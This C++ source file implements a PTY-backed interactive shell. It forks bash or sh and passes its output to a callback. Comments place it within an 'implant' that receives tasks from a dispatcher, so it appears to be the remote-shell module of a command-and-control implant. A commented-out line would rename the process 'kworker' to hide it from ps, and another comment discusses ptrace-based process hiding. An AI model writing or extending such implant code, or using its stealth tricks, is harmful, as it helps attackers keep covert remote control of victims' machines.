#include "InteractiveShell.h"
#include <cstring>
#include <fcntl.h>
#include <iostream>
#include <poll.h>
#include <sys/wait.h>
#include <unistd.h>
#include <vector>

namespace shell {

InteractiveShell* InteractiveShell::s_active_instance = nullptr;

InteractiveShell::InteractiveShell() = default;

InteractiveShell::~InteractiveShell() {
    StopShell();
}

void InteractiveShell::StartShell(ShellCallback callback) {
    if (m_running) return;

    m_callback = std::move(callback);
    m_running  = true;

    // ────────────────────────────────────────────────
    //  1. Create PTY + fork child
    // ────────────────────────────────────────────────
    struct winsize ws{};
    ws.ws_col = m_cols.load();
    ws.ws_row = m_rows.load();
    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    struct termios term{};
    // Use current terminal settings if available, otherwise sane defaults
    if (tcgetattr(STDIN_FILENO, &term) < 0) {
        cfmakeraw(&term);
    }

    m_child_pid = forkpty(&m_master_fd, nullptr, &term, &ws);

    if (m_child_pid < 0) {
        m_running = false;
        if (m_callback) m_callback("ISHELL_OUTPUT:[!] forkpty failed\n");
        return;
    }

    if (m_child_pid == 0) {
        // ────────────────────────────────
        //        Child – exec shell
        // ────────────────────────────────
        // Try bash first, then sh
        const char* shell = "/bin/bash";
        if (access(shell, X_OK) != 0) {
            shell = "/bin/sh";
        }

        // Optional: try to make process less obvious in `ps`
        // (very limited effect – real stealth needs ptrace / process hiding / different binary name)
        // prctl(PR_SET_NAME, "kworker", 0, 0, 0);  // example - risky, breaks many tools

        char* argv[] = {const_cast<char*>(shell), nullptr};
        execve(shell, argv, environ);
        _exit(127);  // failed
    }

    // Parent
    s_active_instance = this;

    // Make master non-blocking
    fcntl(m_master_fd, F_SETFL, O_NONBLOCK);

    // Start reader thread
    m_reader_thread = std::thread(&InteractiveShell::ReaderThreadFunc, this);

    // Optional: signal forwarding thread
    m_signal_thread = std::thread(&InteractiveShell::SignalForwardThreadFunc, this);

    // Catch SIGWINCH in this process (for external resize events)
    struct sigaction sa{};
    sa.sa_handler = SigwinchHandler;
    sa.sa_flags   = SA_RESTART;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGWINCH, &sa, nullptr);

    if (m_callback) {
        m_callback("ISHELL_OUTPUT:[*] PTY shell started (bash/sh)\n");
    }
}

void InteractiveShell::StopShell() {
    if (!m_running) return;

    m_running = false;

    if (m_child_pid > 0) {
        // Send SIGTERM → SIGKILL if needed
        kill(m_child_pid, SIGTERM);
        usleep(200'000);
        if (kill(m_child_pid, 0) == 0) {
            kill(m_child_pid, SIGKILL);
        }
        waitpid(m_child_pid, nullptr, 0);
        m_child_pid = -1;
    }

    if (m_master_fd >= 0) {
        close(m_master_fd);
        m_master_fd = -1;
    }

    if (m_reader_thread.joinable()) {
        m_reader_thread.join();
    }
    if (m_signal_thread.joinable()) {
        m_signal_thread.join();
    }

    s_active_instance = nullptr;

    if (m_callback) {
        m_callback("ISHELL_OUTPUT:[*] Shell terminated\n");
    }
}

void InteractiveShell::WriteToShell(const std::string& command) {
    if (!m_running || m_master_fd < 0) return;

    std::string data = command;
    if (!data.empty() && data.back() != '\n') {
        data += '\n';
    }

    ssize_t n = write(m_master_fd, data.data(), data.size());
    if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
        StopShell();
    }
}

bool InteractiveShell::IsShellRunning() const {
    return m_running && m_child_pid > 0 && kill(m_child_pid, 0) == 0;
}

// ──────────────────────────────────────────────────────────────
//  Background reader – non-blocking poll + forward to callback
// ──────────────────────────────────────────────────────────────
void InteractiveShell::ReaderThreadFunc() {
    std::vector<char> buf(4096);

    struct pollfd pfd{};
    pfd.fd     = m_master_fd;
    pfd.events = POLLIN;

    while (m_running) {
        int r = poll(&pfd, 1, 150);
        if (r < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (r == 0) continue;  // timeout

        if (pfd.revents & (POLLERR | POLLHUP | POLLNVAL)) {
            break;
        }

        if (pfd.revents & POLLIN) {
            ssize_t n = read(m_master_fd, buf.data(), buf.size());
            if (n <= 0) {
                if (n == 0 || (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                    break;
                }
                continue;
            }

            if (m_callback) {
                std::string chunk(buf.data(), n);
                m_callback("ISHELL_OUTPUT:" + chunk);
            }
        }
    }

    // Clean exit
    m_running = false;
    if (m_callback) {
        m_callback("ISHELL_OUTPUT:[*] PTY closed\n");
    }
}

// ──────────────────────────────────────────────────────────────
//  Very simple signal forwarding thread (SIGINT, SIGTERM, etc.)
// ──────────────────────────────────────────────────────────────
void InteractiveShell::SignalForwardThreadFunc() {
    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGINT);
    sigaddset(&set, SIGTERM);
    sigaddset(&set, SIGHUP);

    pthread_sigmask(SIG_BLOCK, &set, nullptr);

    while (m_running) {
        int sig;
        if (sigwait(&set, &sig) == 0) {
            if (m_child_pid > 0) {
                kill(m_child_pid, sig);
            }
        }
    }
}

// Called from signal handler – lightweight
void InteractiveShell::SigwinchHandler(int /*sig*/) {
    if (s_active_instance) {
        s_active_instance->m_resize_pending = true;
    }
}

// Called from main implant thread / task dispatcher when we receive resize task
void InteractiveShell::NotifyResize(int cols, int rows) {
    if (!m_running || m_master_fd < 0) return;

    m_cols = cols;
    m_rows = rows;

    struct winsize ws{};
    ws.ws_col = static_cast<unsigned short>(cols);
    ws.ws_row = static_cast<unsigned short>(rows);

    ioctl(m_master_fd, TIOCSWINSZ, &ws);

    // Also forward SIGWINCH to child so readline / vim / etc. redraw
    if (m_child_pid > 0) {
        kill(m_child_pid, SIGWINCH);
    }
}

} // namespace shell
